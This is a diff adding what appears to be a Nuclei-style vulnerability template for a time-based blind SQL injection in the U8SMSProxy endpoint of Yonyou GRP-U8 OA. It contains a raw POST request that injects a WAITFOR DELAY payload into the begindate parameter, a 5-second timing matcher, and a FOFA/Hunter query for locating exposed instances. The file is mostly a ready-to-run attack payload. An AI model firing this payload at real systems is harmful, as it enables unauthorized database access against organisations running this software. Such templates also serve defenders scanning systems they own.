@@ -1,0 +1,47 @@
+id: poc-b21072714f1bcbe26abf
+info:
+  name: 用友GRP-U8U8SMSProxysql注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/b21072714f1bcbe26abf38a5adc878b6
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: b21072714f1bcbe26abf38a5adc878b6
+    fofa: + hunter`app.name="用友GRP-U8 OA"`
+http:
+- raw:
+  - 'POST /U8SMSProxy?class=XXNote&id=qryyfs HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+
+    Accept-Encoding: gzip, deflate
+
+    Cookie: JSESSIONID=FD111DFB1059473AF214DB0E529918E5
+
+    DNT: 1
+
+    Connection: close
+
+    Upgrade-Insecure-Requests: 1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 78
+
+
+    begindate=2020-09-27'';WAITFOR DELAY ''0:0:5''--&enddate=2020-10-27&search='
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
